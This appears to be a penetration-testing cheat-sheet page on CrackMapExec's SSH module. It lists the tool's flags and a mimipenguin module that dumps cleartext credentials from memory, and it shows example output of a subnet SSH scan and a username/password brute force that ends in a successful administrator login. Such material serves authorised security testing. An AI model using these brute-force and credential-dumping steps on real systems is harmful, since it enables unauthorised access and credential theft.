---
title : "SSH"
# pre : ' '
description : "Own stuff using SSH."
date : 2022-02-14T15:23:02+01:00
# hidden : true
# draft : true
weight : 60
# tags : ['']
---

---

## Installation

Install [CrackMapExec]({{< ref "../crackmapexec" >}})

## Usage

```plain
cme ssh [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-k] [--no-bruteforce] [--continue-on-success] [--use-kcache] [--log LOG] [--aesKey AESKEY [AESKEY ...]]
               [--kdcHost KDCHOST] [--gfail-limit LIMIT | --ufail-limit LIMIT | --fail-limit LIMIT] [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options] [--server {https,http}] [--server-host HOST]
               [--server-port PORT] [--connectback-host CHOST] [--key-file KEY_FILE] [--port PORT] [--no-output] [-x COMMAND] [--remote-enum]
               target [target ...]
```

## Flags

```plain
positional arguments:
  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or .Nessus file(s)

options:
  -h, --help            show this help message and exit
  -id CRED_ID [CRED_ID ...]
                        database credential ID(s) to use for authentication
  -u USERNAME [USERNAME ...]
                        username(s) or file(s) containing usernames
  -p PASSWORD [PASSWORD ...]
                        password(s) or file(s) containing passwords
  -k, --kerberos        Use Kerberos authentication
  --no-bruteforce       No spray when using file for username and password (user1 => password1, user2 => password2
  --continue-on-success
                        continues authentication attempts even after successes
  --use-kcache          Use Kerberos authentication from ccache file (KRB5CCNAME)
  --log LOG             Export result into a custom file
  --aesKey AESKEY [AESKEY ...]
                        AES key to use for Kerberos Authentication (128 or 256 bits)
  --kdcHost KDCHOST     FQDN of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  --gfail-limit LIMIT   max number of global failed login attempts
  --ufail-limit LIMIT   max number of failed login attempts per username
  --fail-limit LIMIT    max number of failed login attempts per host
  -M MODULE, --module MODULE
                        module to use
  -o MODULE_OPTION [MODULE_OPTION ...]
                        module options
  -L, --list-modules    list available modules
  --options             display module options
  --server {https,http}
                        use the selected server (default: https)
  --server-host HOST    IP to bind the server to (default: 0.0.0.0)
  --server-port PORT    start the server on the specified port
  --connectback-host CHOST
                        IP for the remote system to connect back to (default: same as server-host)
  --key-file KEY_FILE   Authenticate using the specified private key. Treats the password parameter as the key's passphrase.
  --port PORT           SSH port (default: 22)

Command Execution:
  Options for executing commands

  --no-output           do not retrieve command output
  -x COMMAND            execute the specified command
  --remote-enum         executes remote commands for enumeration
```

### Modules

The modules below can be used with the `-M` option.

```plain
[*] mimipenguin               Dumps cleartext credentials in memory
```

## Examples

### Checking SSH available

```plain
$ cme ssh 10.10.10.0/24
SSH         10.10.10.2      22     10.10.10.2       [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.4
SSH         10.10.10.1      22     10.10.10.1       [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.4
SSH         10.10.10.3      22     10.10.10.3       [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.4
```

### Brute force SSH

{{%resources fa_icon_class="far fa-file" pattern=".*(txt)"/%}}

```plain
$ cme ssh 10.10.10.1 -u usernames.txt -p passwords.txt 
SSH         10.10.10.1     22     10.10.10.1      [*] SSH-2.0-OpenSSH_8.4p1 Ubuntu-6ubuntu2.1
SSH         10.10.10.1     22     10.10.10.1      [-] 11111:admin Authentication failed.
SSH         10.10.10.1     22     10.10.10.1      [-] 11111:root Authentication failed.
SSH         10.10.10.1     22     10.10.10.1      [-] 11111:admin Authentication failed.
SSH         10.10.10.1     22     10.10.10.1      [-] 11111:root Authentication failed.
SSH         10.10.10.1     22     10.10.10.1      [-] 11111:Admin Authentication failed.
SSH         10.10.10.1     22     10.10.10.1      [-] 11111:Admin Authentication failed.
SSH         10.10.10.1     22     10.10.10.1      [-] 11111:x-admin Authentication failed.
[...]
SSH         10.10.10.1     22     10.10.10.1      [-] administrator:administrator Authentication failed.
SSH         10.10.10.1     22     10.10.10.1      [-] administrator:welkom1234 Authentication failed.
SSH         10.10.10.1     22     10.10.10.1      [+] administrator:x-admin 
```

## URL List

- [Github.com - CrackMapExec](https://github.com/mpgn/CrackMapExec)
- [Github.com - Default-Credentials-List](https://raw.githubusercontent.com/eset/malware-research/master/moose/targeted-vendors/default-credentials-list.txt)
